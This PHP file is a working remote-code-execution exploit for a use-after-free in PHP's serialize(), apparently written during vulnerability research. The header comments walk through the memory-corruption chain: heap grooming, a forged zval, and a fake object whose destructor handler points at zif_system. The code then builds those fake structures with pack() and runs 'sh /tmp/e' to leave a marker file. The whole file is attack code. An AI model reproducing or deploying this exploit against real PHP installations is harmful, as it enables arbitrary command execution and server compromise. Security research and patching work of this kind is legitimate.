<?php
// sr2_call.php — zero5 RCE: vd6 serialize-side UAF -> forged bucket zval ->
// fake zend_object -> handlers->dtor_obj = zif_system(fake execute_data).
//
// Same carrier as sr2_reclaim.php (see header there), payload mode:
// the groom string contains, in its NEVER-WALKED head data[0..232):
//   - a fake zend_object @ data[0]  (doubles as fake zend_execute_data)
//   - a fake zend_string   @ data[96]  ("sh /tmp/e", the system() command)
//   - a fake handler table @ data[152] (dtor_obj = zif_system)
// and in bucket 4 val data[232..248) the forge zval
//   {value = fake-object address, type_info = IS_OBJECT|IS_TYPE_REFCOUNTED}.
//
// When the outer zend_hash_destroy walk resumes at bucket 4 it runs
// zval_ptr_dtor(forge) -> GC_DELREF(fake obj) 1->0 -> rc_dtor_func ->
// zend_objects_store_del(fake obj):
//   - dtor_obj != zend_objects_destroy_object (short-circuit: ce untouched)
//   - GC_SET_REFCOUNT(1); handlers->dtor_obj(obj) = zif_system(obj)
//     with rdi = obj = fake execute_data:
//       num_args      @ +44 = 1
//       arg1 (zval)   @ +80 = {zend_string*, IS_STRING}
//       -> php_exec("sh /tmp/e") -> /tmp/e runs -> marker written
//   - fake obj gc.type_info has IS_OBJ_FREE_CALLED (1<<9) pre-set ->
//     free_obj phase skipped; store_del then efrees obj-0 (= the groom
//     string data start, a 24-byte offset free: poisons the 640-bin
//     freelist head; no further 640-bin allocs happen in this script).
//
// usage: php -n sr2_call.php <BASE_dec16> <ZIF_dec16>
//   BASE = address the groom string will land on (= outer ht's old arData
//          block start; gdb discovery: arData - HT_HASH_SIZE(mask))
//   ZIF  = address of zif_system in the php binary
//   (16-digit zero-padded decimal, vdR convention; run under gdb with
//    randomization disabled so the discovery addresses hold)

$BASE = (int)($argv[1] ?? 0);
$ZIF  = (int)($argv[2] ?? 0);

@unlink('/tmp/pwned_zero5');
file_put_contents('/tmp/e', "id > /tmp/pwned_zero5\n");

class D {
    public function __destruct() {
        $GLOBALS['hits']++;
        $GLOBALS['pf'] = $GLOBALS['prefix'];
        $o = new stdClass;
        $a = [$o, new Groomer, $o];   // elem0 pin = insert #17 = resize trigger
        serialize($a);                // re-entrant, context reuse (level==1)
        $GLOBALS['trace'] .= 'D';
    }
}
class Groomer {
    public function __sleep() {
        $GLOBALS['groom'] = str_pad($GLOBALS['pf'], 608, "\x00");  // the reclaim
        return [];
    }
}
class P1 { public $d1; public $d2; }
class Carrier {
    public function __sleep() {
        $GLOBALS['p1']->d1 = null;
        $GLOBALS['p1']->d2 = null;
        $GLOBALS['trace'] .= 'S';
        return [];
    }
}

$V = function ($off) { global $BASE; return $BASE + 24 + $off; };
$OBJ   = $V(0);      // fake zend_object / zend_execute_data (rdi)
$SMINI = $V(96);     // fake zend_string "sh /tmp/e"
$HT    = $V(152);    // fake zend_object_handlers
$CE    = $V(176);    // fake zend_class_entry (all-zero; never dereferenced)

$pre  = pack('VV', 1, 0x208);            // +0   gc: refcount=1, type=IS_OBJECT,
                                         //      flags = IS_OBJ_FREE_CALLED (1<<9)
$pre .= pack('VV', 0, 0);                // +8   handle=0, extra_flags=0
$pre .= pack('P', $CE);                  // +16  ce (untouched: dtor short-circuit)
$pre .= pack('P', $HT);                  // +24  handlers
$pre .= pack('P', 0);                    // +32  properties
$pre .= pack('P', 0x0000000100000000);   // +40  This.u1=0 / u2.num_args@+44=1
$pre .= str_repeat("\x00", 32);          // +48  prev/symbol_table/run_time_cache/extra
$pre .= pack('PVV', $SMINI, 6, 0);       // +80  arg1 = {zend_string*, IS_STRING}
$pre .= pack('VV', 1, 0x1006);           // +96  SMINI gc: rc=1, GC_STRING
$pre .= pack('P', 0);                    // +104 h
$pre .= pack('P', 9);                    // +112 len = 9
$pre .= "sh /tmp/e\x00";                 // +120 val (10 bytes)
$pre .= str_repeat("\x00", 152 - 130);   // pad to 152
$pre .= pack('VV', 0, 0);                // +152 handlers.offset = 0
$pre .= pack('P', 0);                    // +160 free_obj (skipped: flag pre-set)
$pre .= pack('P', $ZIF);                 // +168 dtor_obj = zif_system  <<<< CALL
$pre .= str_repeat("\x00", 232 - 176);   // +176 CE zero region
$pre .= pack('PVV', $OBJ, 0x108, 0);     // +232 BUCKET-4 FORGE {OBJ, IS_OBJECT|RC}
$GLOBALS['prefix'] = $pre;               // 248 bytes

$GLOBALS['hits'] = 0; $GLOBALS['trace'] = '';
$GLOBALS['fs'] = [];
for ($i = 0; $i < 5; $i++) $GLOBALS['fs'][] = new stdClass;
$d = new D;
$GLOBALS['p1'] = new P1;
$GLOBALS['p1']->d1 = $d;
$GLOBALS['p1']->d2 = $d;
unset($d);
$arr = [$GLOBALS['p1']];
for ($i = 0; $i < 5; $i++) $arr[] = $GLOBALS['fs'][$i];
$arr[] = new Carrier;
$s = serialize($arr);
echo "hits={$GLOBALS['hits']} trace={$GLOBALS['trace']} len=" . strlen($s) . "\n";
echo "CALL-RETURNED\n";
if (is_file('/tmp/pwned_zero5')) {
    echo "MARKER-ON-DISK: " . trim(file_get_contents('/tmp/pwned_zero5')) . "\n";
}
echo "SURVIVED\n";
